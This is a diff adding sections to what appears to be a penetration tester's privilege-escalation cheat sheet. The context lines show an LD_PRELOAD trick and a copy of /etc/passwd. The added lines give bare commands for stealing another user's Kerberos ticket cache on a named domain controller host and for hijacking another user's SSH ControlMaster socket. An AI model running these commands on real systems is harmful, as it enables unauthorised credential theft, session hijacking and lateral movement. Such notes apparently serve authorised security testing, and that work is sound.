@@ -43,3 +43,18 @@ export LD_PRELOAD=[path to so file]
 cp /etc/passwd /tmp/test
 ```
 
+## Kerberos
+```
+klist
+kvno cifs/dmzdc01.complyedge.com
+sudo cp /tmp/krb5cc_75401103_hOg8VH /tmp/krb5cc_minenow
+export KRB5CCNAME=/tmp/krb5cc_minenow
+```
+
+## controlmaster
+* Check ssh config first  
+* Check /.ssh/controlmaster/ if same user, ssh directly
+* if with sudo
+```
+ssh -S /home/testuser/.ssh/controlmaster/testuser\@testbox\:22 testuser@testbox
+```
